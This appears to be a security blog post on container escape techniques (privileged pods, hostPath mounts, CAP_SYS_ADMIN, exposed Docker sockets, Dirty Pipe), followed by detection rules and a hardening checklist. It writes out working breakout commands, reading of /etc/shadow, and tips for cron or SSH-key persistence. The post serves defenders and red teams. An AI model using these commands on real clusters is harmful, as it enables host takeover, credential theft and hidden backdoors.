---
title: 'Container Escape Techniques: From Privileged Pods to Host Compromise'
description: 'Analyzing modern container breakout methods and defensive strategies for securing containerized environments'
pubDate: 'Dec 25 2024'
---

Container escapes represent one of the most critical threats in cloud-native environments. Understanding these techniques is essential for both red and blue teams.

## Privileged Container Breakout

The most straightforward escape vector: privileged containers have nearly all Linux capabilities and can access host devices.

### Exploitation Path

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: attacker
    image: ubuntu:latest
    securityContext:
      privileged: true
```

Once inside:
```bash
# Mount host filesystem
mkdir /host
mount /dev/sda1 /host

# Access host root
chroot /host

# We're now root on the host node
cat /etc/shadow
```

## hostPath Volume Abuse

Even without privileged mode, `hostPath` volumes can provide escape opportunities.

```yaml
volumes:
- name: host-root
  hostPath:
    path: /
    type: Directory
volumeMounts:
- name: host-root
  mountPath: /host
```

From here, write to `/host/etc/cron.d/` for persistence or `/host/root/.ssh/` for backdoor access.

## Kernel Exploits: CVE-2022-0847 (Dirty Pipe)

The Dirty Pipe vulnerability allowed overwriting read-only files, enabling container escape without special permissions.

**Proof of concept flow:**
1. Find writable pipe in container
2. Use splice() to write to read-only files
3. Overwrite `/etc/passwd` on host
4. SSH with modified credentials

## CAP_SYS_ADMIN: The Universal Key

Containers with `CAP_SYS_ADMIN` can mount filesystems, manipulate namespaces, and perform other privileged operations.

```bash
# Check capabilities
capsh --print

# If CAP_SYS_ADMIN present, mount host fs
mount -t cgroup -o devices devices /mnt
echo 'a *:* rwm' > /mnt/devices.allow
```

## Docker Socket Exposure

Mounting the Docker socket is equivalent to root on the host.

```yaml
volumeMounts:
- name: docker-sock
  mountPath: /var/run/docker.sock
```

Exploitation:
```bash
# Launch privileged container
docker run -it --privileged --net=host \
  --pid=host --ipc=host --volume /:/host \
  ubuntu chroot /host
```

## Detection Strategies

### Monitor for Suspicious Mounts
```bash
# Falco rule
- rule: Mount Sensitive Host Path
  desc: Detect mounting of sensitive host directories
  condition: >
    evt.type = mount and 
    container and 
    (fd.name startswith /host/proc or 
     fd.name startswith /host/etc or
     fd.name startswith /host/root)
  priority: CRITICAL
```

### Audit Container Security Contexts
```bash
# Find privileged pods
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged==true) |
  {ns: .metadata.namespace, pod: .metadata.name}'
```

### Runtime Protection with Seccomp
```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault  # Blocks dangerous syscalls
```

## Hardening Checklist

- [ ] Enforce Pod Security Standards (restricted profile)
- [ ] Drop ALL capabilities, add back only what's needed
- [ ] Use read-only root filesystems
- [ ] Never run containers as UID 0
- [ ] Implement AppArmor/SELinux policies
- [ ] Scan images for vulnerabilities before deployment
- [ ] Use admission controllers (OPA/Kyverno) to enforce policies

Remember: defense in depth. No single control prevents all escapes, but layered security makes exploitation significantly harder.
